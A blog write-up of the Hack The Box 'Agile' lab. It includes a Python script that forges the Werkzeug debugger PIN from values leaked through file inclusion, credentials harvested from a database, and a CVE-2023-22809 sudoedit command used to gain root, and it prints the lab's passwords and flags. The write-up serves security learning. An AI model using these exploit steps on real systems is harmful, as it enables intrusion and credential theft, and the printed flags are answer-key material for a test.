---
layout: post
title: HTB Agile Writeup
date: 2023-08-15 19:39 +0600
author: animesh
toc: true
tags:
  [
    "htb",
    "hackthebox",
    "CVE-2023-22809",
    "chrome_remote_debugging",
    "lfi",
    "werkzeug_pin",
  ]
categories: ["Hackthebox"]
render_with_liquid: false
comments: true
image:
  path: /posts/htb-agile-writeup/Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Agile.png
  alt: HTB Agile
---

## Overview

This was a very interesting box with lots of rabbit holes. Initial foothold was obtained by exploiting LFI to leak some file and use that to find the debug pin of Werkzeug Debugger. Got the user creds from mysql database and from there got the 2nd user creds via chrome remote debugger. Finally got root by exploiting CVE-2023-22809.

![Agile.png](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Agile.png)

**Name -** Agile

**Difficulty -** Medium

**OS -** Linux

**Points -** 30

## Information Gathering

### **Port Scan**

Basic Scan

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-12 04:50 EDT
Nmap scan report for 10.10.11.203
Host is up (0.091s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.63 seconds
```

Version Scan

```bash
╰─ nmap 10.10.11.203 -p22,80 -sC -sV
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-12 04:50 EDT
Nmap scan report for 10.10.11.203
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
```

### **HTTP Enumeration**

Visiting the website gives us the following

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled.png)

There is register and login option. I register one test user and logged in with that

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%201.png)

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%202.png)

We can add password in the vault and export that vault. I got lfi in the following

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%203.png)

Also, If we pass some invalid parameter, It will give us the debug page.

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%204.png)

But the debugger is locked. To exploit this, I used the following code

```bash
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
    'www-data',# username
    'flask.app',# modname
    'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '345052384868',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print("Pin: " + rv)
```

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%205.png)

Found the pin 110-709-587. After using that pin, The console unlocked. and now I can run commands from here

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%206.png)

## Getting User.txt

I made a reverse shell.

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%207.png)

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%208.png)

Got credential for mysql from /app directory

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%209.png)

Mysql Creds - **superpassuser:dSA6l7q\*yIVs$39Ml6ywvgK**

With that creds, I tried to log into mysql and from mysql I found some more creds.

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2010.png)

From those creds, this one worked **corum:5db7caa1d13cc37c9fc2**

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2011.png)

Then I got the user flag from the home directory

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2012.png)

User Flag - 6d3d0e7906171b800a450d3640c8987e

## Getting root.txt

We get a dev or test site also

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2013.png)

And also remote dubugging port is set to 41829.

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2014.png)

In chrome, We can access it through chrome://inspect option. I got the creds from there

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2015.png)

Creds - **edwards:d07867c6267dcb5df0af**

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2016.png)

Now from that user rooting was fairly easy.

```bash
edwards@agile:~$ sudo -l
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
edwards@agile:~$
```

So, edwards can edit 2 files as dev_admin using sudoedit. But, there is a CVE (**CVE-2023-22809**) which allows edwards to read and write other files as well which are owned by dev_admin.

So, which file to write. For that I ran pspy to check any cronjob. And I found out, root user is running **source /app/venv/bin/activate** in every minute. and the dev_admin user can edit it.

```bash
edwards@agile:/app/app-testing$ ls -al /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Jul 12 14:06 /app/venv/bin/activate
```

So, I opened the file using **CVE-2023-22809** edited it with a simple payload.

```bash
EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
```

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2017.png)

After a minute, I got the setuid file and became root

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2018.png)

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2019.png)

Finally I grabbed the root flag

![Untitled](Agile%207ca8a4a849f84218b33b27a1bf90bc3f/Untitled%2020.png)

Root Flag - f7ad677bce5fdd00982dfd8dc8edb0ab

## Flags

**user.txt -** 6d3d0e7906171b800a450d3640c8987e

**root.txt -** f7ad677bce5fdd00982dfd8dc8edb0ab
